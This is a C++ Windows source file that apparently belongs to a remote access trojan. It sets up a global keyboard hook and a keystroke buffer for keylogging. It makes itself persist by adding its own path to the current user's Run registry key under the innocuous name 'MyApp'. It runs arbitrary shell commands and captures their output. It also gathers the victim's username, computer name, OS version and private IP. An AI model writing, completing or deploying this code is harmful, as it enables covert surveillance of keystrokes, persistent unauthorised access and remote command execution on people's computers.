#include <windows.h>
#include <stdio.h>
#include <string>
#include <Lmcons.h>
#include <vector>
#include <iphlpapi.h>
#include <iostream>
#include <atomic>

#include "core.h"

#pragma comment(lib, "ntdll.lib") // Link to ntdll.lib
#pragma comment(lib, "iphlpapi.lib")

HHOOK keyboardHook;
std::string keystrokes;
std::atomic<bool> keepLogging(true);  // Global atomic flag to control logging

typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);




/*
DWORD dwSize = UNLEN + 1;
char username[UNLEN + 1];
GetUserNameA(username, &dwSize); works because of automatic decay,
userInfo->UserName = username;

This is a common implementation, but leaves extra memory on the stack
*/

bool IsPrivateIP(const std::string& ipAddress) {

	if (ipAddress.find("10.") == 0) {
		return true;
	}
	else if (ipAddress.find("172.") == 0) {
		int secondOctet = std::stoi(ipAddress.substr(4, ipAddress.find('.', 4) - 4));
		if (secondOctet >= 16 && secondOctet <= 31) {
			return true;
		}
	}
	else if (ipAddress.find("192.168.") == 0) {
		return true;
	}
	return false;
}

std::string GetUserIP() {
	IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters

	DWORD adapterInfoSize = sizeof(adapterInfo);
	if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
		printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
		return "Failed to get IP";
	}

	for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
		std::string ipAddress = adapter->IpAddressList.IpAddress.String;

		// Check if the IP address is within private IP ranges
		if (IsPrivateIP(ipAddress)) {
			std::cout << "Private Network IP: " << ipAddress << std::endl;
			return ipAddress;
		}
	}


	return "No IP Address Found";

}

bool persistence() {
	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	HKEY hKey;
	const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	const char* valueName = "MyApp"; // Name for the registry value

	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
	if (result == ERROR_SUCCESS) {
		result = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
		if (result == ERROR_SUCCESS) {
			std::cout << "Successfully added to startup: " << exePath << std::endl;
			return true;
		}
		else {
			std::cerr << "Error setting registry value: " << result << std::endl;
			return false;
		}
		RegCloseKey(hKey);
	}
	else {
		std::cerr << "Error opening registry key: " << result << std::endl;
		return false;
	}

	return false;
}




std::string exec(const std::string& cmd) {
	std::string result;
	char buffer[128];

	FILE* pipe = _popen(cmd.c_str(), "r");
	if (!pipe) {
		throw std::runtime_error("Failed to open pipe");
	}


	while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
		result += buffer;
	}

	// Close the pipe
	_pclose(pipe);

	if (result.empty()) {
		result = "not a valid command"; // Custom message if no output was returned
	}

	return result;
}

BOOL GetBasicUserInformation(struct BasicUserInformation& basicUserInformation) {
	DWORD userNameBuffer = UNLEN + 1;
	DWORD osBuffer = sizeof(OSVERSIONINFO);
	DWORD computerNameBuffer = MAX_COMPUTERNAME_LENGTH + 1;
	



	// basicUserInformation.UserName = (LPSTR)malloc(userNameBuffer);
	// basicUserInformation.Os = (LPSTR)malloc(osBuffer)

	basicUserInformation.UserName = new char[userNameBuffer]; // no need for casting
	basicUserInformation.ComputerName = new char[computerNameBuffer];
	basicUserInformation.osvi = new RTL_OSVERSIONINFOW; // Allocate memory for osvi


	// mandatory for setting OS version.
	basicUserInformation.osvi->dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);

	if (basicUserInformation.UserName == nullptr || basicUserInformation.osvi == nullptr || basicUserInformation.ComputerName == nullptr) {
		printf("Error Allocating Memory\n");
		return FALSE;
	}

	if (!GetUserNameA(basicUserInformation.UserName, &userNameBuffer)) {
		printf("Error Getting Username\n");
		return FALSE;
	}

	if (!GetComputerNameA(basicUserInformation.ComputerName, &computerNameBuffer)) {
		printf("Error Getting Computer Name");
		return FALSE;
	}

	RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == nullptr) {
		printf("Error Getting RtlGetVersion address\n");
		return FALSE;
	}

	basicUserInformation.osvi->dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
	NTSTATUS status = RtlGetVersion(basicUserInformation.osvi);
	if (status != 0) { // Check if the call was successful
		printf("Error Getting OS Version: %lx\n", status);
		return FALSE;
	}


	return TRUE;

}

